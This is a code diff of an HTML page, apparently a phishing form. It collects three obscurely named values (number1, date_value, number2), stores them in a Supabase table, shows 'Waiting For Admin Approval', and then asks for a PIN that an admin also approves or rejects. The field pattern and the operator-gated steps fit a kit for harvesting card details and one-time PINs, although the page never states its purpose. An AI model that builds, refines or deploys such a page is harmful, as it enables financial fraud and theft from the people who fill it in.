@@ -1,5 +1,6 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
 <head>
 
 <meta charset="UTF-8">
@@ -22,10 +23,10 @@
 
 body{
     min-height:100vh;
+    background:#0f0f0f;
     display:flex;
     justify-content:center;
     align-items:center;
-    background:#0f0f0f;
     overflow:hidden;
     padding:20px;
 }
@@ -65,8 +66,8 @@ body{
 }
 
 h2{
-    color:white;
     text-align:center;
+    color:white;
     margin-bottom:30px;
     font-size:32px;
     font-weight:700;
@@ -74,13 +75,13 @@ h2{
 
 input{
     width:100%;
-    margin-bottom:18px;
     padding:15px;
+    margin-bottom:18px;
     border:none;
+    outline:none;
     border-radius:14px;
     background:rgba(255,255,255,0.08);
     color:white;
-    outline:none;
     font-size:15px;
 }
 
@@ -107,8 +108,8 @@ button:hover{
 
 #status{
     margin-top:25px;
-    color:white;
     text-align:center;
+    color:white;
 }
 
 .wait{
@@ -118,8 +119,8 @@ button:hover{
 
 .reject{
     color:#ff4d6d;
-    font-weight:600;
-    font-size:20px;
+    font-size:22px;
+    font-weight:700;
 }
 
 .success{
@@ -147,6 +148,7 @@ button:hover{
 </style>
 
 </head>
+
 <body>
 
 <div class="bg1"></div>
@@ -177,6 +179,10 @@ Continue
 
 <script>
 
+// ======================
+// SUPABASE
+// ======================
+
 const SUPABASE_URL =
 'https://ijvtokyhuqrwndyfxzrn.supabase.co';
 
@@ -189,10 +195,13 @@ const client = window.supabase.createClient(
 );
 
 let currentId = null;
-let interval;
+let interval = null;
 
 
+// ======================
 // SUBMIT FORM
+// ======================
+
 async function submitForm(){
 
     const number1 =
@@ -204,6 +213,8 @@ async function submitForm(){
     const number2 =
     document.getElementById('number2').value;
 
+
+    // VALIDATION
     if(!number1 || !date_value || !number2){
 
         alert('Please Fill All Fields');
@@ -211,6 +222,8 @@ async function submitForm(){
         return;
     }
 
+
+    // LOADING
     document.getElementById('status').innerHTML = `
 
     <div class="loader"></div>
@@ -221,13 +234,15 @@ async function submitForm(){
 
     `;
 
+
+    // INSERT
     const { data, error } = await client
     .from('requests')
     .insert([
         {
-            number1,
-            date_value,
-            number2,
+            number1:number1,
+            date_value:date_value,
+            number2:number2,
             status:'pending',
             pin:'',
             pin_status:'waiting'
@@ -235,28 +250,39 @@ async function submitForm(){
     ])
     .select();
 
+
+    // ERROR
     if(error){
 
+        console.log(error);
+
         document.getElementById('status').innerHTML = `
+
         <div class="reject">
         Error Submitting Form
         </div>
-        `;
 
-        console.log(error);
+        `;
 
         return;
     }
 
+
+    // SAVE ID
     currentId = data[0].id;
 
+
+    // START STATUS CHECK
     listenStatus();
 
 }
 
 
 
+// ======================
 // REALTIME STATUS
+// ======================
+
 function listenStatus(){
 
     clearInterval(interval);
@@ -269,6 +295,7 @@ function listenStatus(){
         .eq('id',currentId)
         .single();
 
+
         if(error){
 
             console.log(error);
@@ -276,27 +303,45 @@ function listenStatus(){
             return;
         }
 
-        // WAITING
+
+        const statusDiv =
+        document.getElementById('status');
+
+
+
+        // ======================
+        // WAITING ADMIN
+        // ======================
+
         if(data.status === 'pending'){
 
-            document.getElementById('status').innerHTML = `
+            if(!statusDiv.innerHTML.includes('Waiting For Admin')){
 
-            <div class="loader"></div>
+                statusDiv.innerHTML = `
 
-            <div class="wait">
-            Waiting For Admin Approval...
-            </div>
+                <div class="loader"></div>
 
-            `;
+                <div class="wait">
+                Waiting For Admin Approval...
+                </div>
+
+                `;
+
+            }
 
         }
 
+
+
+        // ======================
         // REJECTED
+        // ======================
+
         else if(data.status === 'rejected'){
 
             clearInterval(interval);
 
-            document.getElementById('status').innerHTML = `
+            statusDiv.innerHTML = `
 
             <div class="reject">
             Request Rejected
@@ -306,18 +351,30 @@ function listenStatus(){
 
         }
 
+
+
+        // ======================
         // ACCEPTED
+        // ======================
+
         else if(data.status === 'accepted'){
 
-            // PIN WAITING
+
+            // ======================
+            // ENTER PIN
+            // ======================
+
             if(data.pin_status === 'waiting'){
 
-                // RELOAD STOP
+                // AGAR PIN INPUT HAI
+                // TO RELOAD MAT KARO
+
                 if(!document.getElementById('pin')){
 
-                    document.getElementById('status').innerHTML = `
+                    statusDiv.innerHTML = `
 
-                    <input type="text"
+                    <input
+                    type="text"
                     id="pin"
                     placeholder="Enter PIN">
 
@@ -331,27 +388,41 @@ function listenStatus(){
 
             }
 
+
+
+            // ======================
             // PIN PENDING
+            // ======================
+
             else if(data.pin_status === 'pending'){
 
-                document.getElementById('status').innerHTML = `
+                if(!statusDiv.innerHTML.includes('Waiting For PIN')){
 
-                <div class="loader"></div>
+                    statusDiv.innerHTML = `
 
-                <div class="wait">
-                Waiting For PIN Approval...
-                </div>
+                    <div class="loader"></div>
 
-                `;
+                    <div class="wait">
+                    Waiting For PIN Approval...
+                    </div>
+
+                    `;
+
+                }
 
             }
 
-            // PIN REJECT
+
+
+            // ======================
+            // PIN REJECTED
+            // ======================
+
             else if(data.pin_status === 'rejected'){
 
                 clearInterval(interval);
 
-                document.getElementById('status').innerHTML = `
+                statusDiv.innerHTML = `
 
                 <div class="reject">
                 PIN Rejected
@@ -361,12 +432,17 @@ function listenStatus(){
 
             }
 
+
+
+            // ======================
             // SUCCESS
+            // ======================
+
             else if(data.pin_status === 'accepted'){
 
                 clearInterval(interval);
 
-                document.getElementById('status').innerHTML = `
+                statusDiv.innerHTML = `
 
                 <div class="success">
                 Congratulations 🎉
@@ -384,12 +460,17 @@ function listenStatus(){
 
 
 
+// ======================
 // SUBMIT PIN
+// ======================
+
 async function submitPin(){
 
     const pin =
     document.getElementById('pin').value;
 
+
+    // VALIDATION
     if(!pin){
 
         alert('Enter PIN');
@@ -397,6 +478,8 @@ async function submitPin(){
         return;
     }
 
+
+    // LOADING
     document.getElementById('status').innerHTML = `
 
     <div class="loader"></div>
@@ -407,13 +490,30 @@ async function submitPin(){
 
     `;
 
-    await client
+
+    // UPDATE PIN
+    const { error } = await client
     .from('requests')
     .update({
         pin:pin,
         pin_status:'pending'
     })
     .eq('id',currentId);
+
+
+    if(error){
+
+        console.log(error);
+
+        document.getElementById('status').innerHTML = `
+
+        <div class="reject">
+        Error Submitting PIN
+        </div>
+
+        `;
+
+    }
 
 }
 
